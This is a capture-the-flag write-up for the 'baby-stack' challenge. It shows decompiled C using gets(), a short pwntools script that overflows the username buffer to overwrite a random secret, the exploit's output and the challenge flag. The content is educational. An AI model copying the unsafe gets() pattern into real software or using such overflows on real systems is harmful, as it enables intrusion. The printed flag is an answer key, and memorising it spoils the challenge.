# baby-stack

[library.m0unt41n.ch/challenges/baby-stack](https://library.m0unt41n.ch/challenges/baby-stack) ![](../../resources/pwn.svg) ![](../../resources/baby.svg) 

# TL;DR

Indeed, a very simple buffer overwflow.

# Decompilation

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, const char **argv, const char **envp) {
  char username[69]; // [rsp+10h] [rbp-80h] BYREF
  char buf[10];      // [rsp+55h] [rbp-3Bh] BYREF

  FILE *f = fopen("/dev/urandom", "r");
  if ( fread(buf, 1, 10, f) != 10 ) {
    printf("Bad randomness! Aborting...");
    exit(1);
  }
  printf("Welcome to baby-stack. Please login to get the flag.\nUsername: ");
  fflush(stdin);
  if ( ! gets(username) ) {
    puts("Please enter a username.");
    exit(1);
  }
  printf("Welcome, %s\n", username);
  fflush(stdin);
  puts("You will only get the flag if you can guess every character perfectly");
  fflush(stdin);
  for ( int i = 0; i <= 9; ++i ) {
    printf("Your guess: ");
    fflush(stdin);
    int c = (int)(buf[i] % 26 + 97);
    if ( c != getchar() ) {
      printf("\nSorry, no luck (character was '%c').\n", (char)c);
      exit(1);
    }
    puts("\nCorrect! Again...");
    fflush(stdin);
    getchar();
    sleep(1u);
  }
  char *flag = getenv("FLAG");
  if ( flag ) puts(flag);
         else puts("Flag is missing");
  puts("How did we get here, this should be impossible!");
  return fflush(stdin);
}
```

# Analysis

The binary initializes `buf[]` with 10 random bytes and the user has to guess all of them -
not literally, but by providing a character that will match `buf[i] % 26 + 97` pattern.

The binary is missing most protections:

```
$ checksec --file=baby-stack
RELRO     STACK CANARY     NX           PIE     RPATH     RUNPATH     Symbols     FORTIFY
No RELRO  No canary found  NX disabled  No PIE  No RPATH  No RUNPATH  44 Symbols  No
```

... although we don't even need that &#128578; The vulnerabiliity is in `gets(username)`,
which enables overflowing `buf[]` with known characters. So, if we put `B` in there,
all our guesses have to be `o` (`chr(ord('B') % 26 + 97)`). Simple exploit:

```python
import pwn
import os
pwn.context(arch='amd64', os='linux')
os.environ["FLAG"] = "flag{not_a_flag}"
io = pwn.process("./baby-stack")
io.sendline(b'A'*69+b'B'*10)
for i in range(10):
    io.sendline(b'o')
io.interactive()
```

Result:

```
$ ./exploit.py 
[+] Starting local process './baby-stack': pid 180647
[*] Switching to interactive mode
Welcome to baby-stack. Please login to get the flag.
Username: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBB
You will only get the flag if you can guess every character perfectly
Your guess: 
Correct! Again...
Your guess: 
Correct! Again...
Your guess: 
Correct! Again...
Your guess: 
Correct! Again...
Your guess: 
Correct! Again...
Your guess: 
Correct! Again...
Your guess: 
Correct! Again...
Your guess: 
Correct! Again...
Your guess: 
Correct! Again...
Your guess: 
Correct! Again...
flag{not_a_flag}
How did we get here, this should be impossible!
[*] Process './baby-stack' stopped with exit code 0 (pid 180647)
[*] Got EOF while reading in interactive
```

# Getting the flag

Running this against remote backend works just as well.

---

## `flag{y0ur_f1r5t_s74ck_0v3rfl0w???}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
